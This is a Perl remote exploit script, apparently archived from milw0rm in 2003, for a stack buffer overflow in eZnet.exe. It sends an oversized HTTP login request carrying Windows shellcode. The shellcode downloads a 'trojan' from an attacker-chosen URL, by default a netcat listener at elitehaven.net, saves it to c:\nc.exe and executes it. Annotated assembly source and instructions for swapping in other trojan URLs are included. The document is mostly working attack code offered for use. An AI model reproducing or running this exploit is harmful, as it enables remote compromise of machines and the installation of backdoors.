#!/usr/bin/perl -w
# 
# Stack Overflow in eZnet.exe - Remote Exploit
# 
# Will download a trojan from any address which you provide
# on the target system, then will execute the trojan.
# 
# For this exploit I have tried several strategies to increase
# reliability and performance:
# 
# + Jump to a static 'call esp'
# + Backwards jump to code a known distance from the stack pointer
#    since the stack address seems to change for each version of
#    eznet.
# + Works out the byte difference for custom urls
#    (must be no longer than 254 bytes!!)
# + Causes eznet.exe to restart (not really my choice ;o)
# + Shellcode steals addresses from a static module.
# 
# (Shellcode is attached to the bottom of this file!)
#
# - by Peter Winter-Smith [peter4020@hotmail.com]

use IO::Socket;

if(!($ARGV[1]))
{
print "\nUsage: eZnetexploit.pl <victim> <url of trojan>\n" .
      " + netcat trojan at http://www.elitehaven.net/ncat.exe\n" .
      " + listens on port 9999.\n\n";
exit;
}

print "eZnet.exe remote trojan downloader exploit\n";

$victim = IO::Socket::INET->new(Proto=>'tcp',
                               PeerAddr=>$ARGV[0],
                               PeerPort=>"80")
                           or die "Unable to connect to $ARGV[0] on port 80";

$tlen = chr(length($ARGV[1]) + 1);

$shellcode =            "\xEB\x3C\x5F\x55\x89\xE5\x81\xC4" .
                        "\xE8\xFF\xFF\xFF\x57\x31\xDB\xB3" .
                        "\x07\xB0\xFF\xFC\xF2\xAE\xFE\x47" .
                        "\xFF\xFE\xCB\x80\xFB\x01\x75\xF4" .
                        "\x5F\x57\x8D\x7F\x0B\x57\x8D\x7F" .
                        "\x13\x57\x8D\x7F\x08\x57\x8D\x7F" .
                                                    $tlen  .
                            "\x57\x8D\x7F\x09\x47\x57\x8D" .
                        "\x54\x24\x14\x52\xEB\x02\xEB\x52" .
                        "\x89\xD6\xFF\x36\xFF\x15\x1C\x91" .
                        "\x04\x10\x5A\x52\x8D\x72\xFC\xFF" .
                        "\x36\x50\xFF\x15\xCC\x90\x04\x10" .
                        "\x5A\x52\x31\xC9\x51\x51\x8D\x72" .
                        "\xF0\xFF\x36\x8D\x72\xF4\xFF\x36" .
                        "\x51\xFF\xD0\x5A\x52\xFF\x72\xEC" .
                        "\xFF\x15\x1C\x91\x04\x10\x5A\x52" .
                        "\x8D\x72\xF8\xFF\x36\x50\xFF\x15" .
                        "\xCC\x90\x04\x10\x5A\x52\x31\xC9" .
                        "\x41\x51\x8D\x72\xF0\xFF\x36\xFF" .
                        "\xD0\xCC\xE8\x6B\xFF\xFF\xFF\x55" .
                        "\x52\x4C\x4D\x4F\x4E\x2E\x44\x4C" .
                        "\x4C\xFF\x55\x52\x4C\x44\x6F\x77" .
                        "\x6E\x6C\x6F\x61\x64\x54\x6F\x46" .
                        "\x69\x6C\x65\x41\xFF\x57\x69\x6E" .
                        "\x45\x78\x65\x63\xFF" .  $ARGV[1] .
                                                    "\xFF" .
                        "\x63\x3A\x5C\x6E\x63\x2E\x65\x78" .
                        "\x65\xFF\x6B\x65\x72\x6E\x65\x6C" .
                        "\x33\x32\x2E\x64\x6C\x6C\xFF";

$jmpcode =              "\x89\xE0\x66\x2D\x38\x32\xFF\xE0";

$eip = "\xBB\x33\x05\x10";

$packet = "" .
  "GET /SwEzModule.dll?operation=login&autologin=" .
  "\x90"x65 . $shellcode . "a"x(4375 - length($ARGV[1])) . $eip . "\x90"x20 . $jmpcode .
  "\x20HTTP/1.0.User-Agent: SoftwaxAsys/2.1.10\n\n";
                  
print $victim $packet;

print " + Making Request ...\n + Trojan should download - best of luck!\n";

sleep(4);
close($victim);

print "Done.\n";
exit;

#-----------------------------[vampiric.asm]------------------------------
# ; 'eZnet.exe' (eZmeeting, eZnetwork, eZphotoshare, eZshare, eZ)
# ;   (cryptso.dll vampiric shellcode)
# ; Url Download + Execute
# ; By Peter Winter-Smith
# ; [peter4020@hotmail.com]
# 
# bits 32
# 
# jmp short killnull
# 
# next:
# pop edi
# 
# push ebp
# mov ebp, esp
# add esp, -24
# 
# push edi
# 
# xor ebx, ebx
# mov bl, 07h
# mov al, 0ffh
# 
# cld
# nullify:
# repne scasb
# inc byte [edi-01h]
# dec bl
# cmp bl, 01h
# jne nullify
# 
# pop edi
# 
# push edi		; 'URLMON.DLL'
# lea edi, [edi+11]
# push edi		; 'URLDownloadToFileA'
# lea edi, [edi+19]
# push edi		; 'WinExec'
# lea edi, [edi+08]
# push edi		; 'http://www.elitehaven.net/ncat.exe'
# lea edi, [edi+35]
# push edi		; 'c:\nc.exe'
# lea edi, [edi+09]
# inc edi
# push edi		; 'kernel32.dll'
# 
# lea edx, [esp+20]
# push edx
# 
# jmp short over
# killnull:
# jmp short data
# over:
# 
# mov esi, edx
# push dword [esi]
# 
# call [1004911ch]	; LoadLibraryA
# 
# pop edx
# push edx
# lea esi, [edx-04]
# push dword [esi]
# 
# push eax
# 
# call [100490cch]	; GetProcAddress("URLMON.DLL", URLDownloadToFileA);
# 
# pop edx
# push edx
# 
# xor ecx, ecx
# push ecx
# push ecx
# lea esi, [edx-16]	; file path
# push dword [esi]
# lea esi, [edx-12]	; url
# push dword [esi]
# push ecx
# 
# call eax
# 
# pop edx
# push edx
# 
# push dword [edx-20]
# 
# call [1004911ch]	; LoadLibraryA
# 
# pop edx
# push edx
# 
# 
# lea esi, [edx-08]
# push dword [esi]	; 'WinExec'
# push eax		; kernel32.dll handle
# 
# call [100490cch]	; GetProcAddress("kernel32.dll", WinExec);
# 
# pop edx
# push edx
# 
# xor ecx, ecx
# inc ecx
# push ecx
# 
# lea esi, [edx-16]	; file path
# push dword [esi]
# 
# call eax
# 
# int3
# 
# ta:
# call next
# db 'URLMON.DLL',0ffh
# db 'URLDownloadToFileA',0ffh
# db 'WinExec',0ffh
# db 'http://www.elitehaven.net/ncat.exe',0ffh
# ; When altering, you MUST be sure
# ; to also alter the offsets in the 0ffh to null
# ; byte search!
# ; for example:
# ;   db 'http://www.site.com/someguy/trojan.exe',0ffh
# ; count the length of the url, and add one for the 0ffh byte.
# ; The above url is 38 bytes long, plus one for our null, is 39 bytes.
# ; find the code saying (at the start of the shellcode):
# ;   push edi		; 'http://www.elitehaven.net/ncat.exe'
# ;   lea edi, [edi+35]
# ; and make it:
# ;   push edi		; 'http://www.site.com/someguy/trojan.exe'
# ;   lea edi, [edi+39]
# ; same goes for the filename below :o)
# db 'c:\nc.exe',0ffh
# db 'kernel32.dll',0ffh
#-------------------------------------------------------------------------

#------------------------------[subcode.asm]------------------------------
# ; eZnet.exe Sub-Shellcode
# ; [peter4020@hotmail.com]
# 
# ;100533BBh
# 
# bits 32
# 
# mov eax, esp
# sub ax, 3238h
# jmp eax
#-----------------------------------------------




# milw0rm.com [2003-12-15]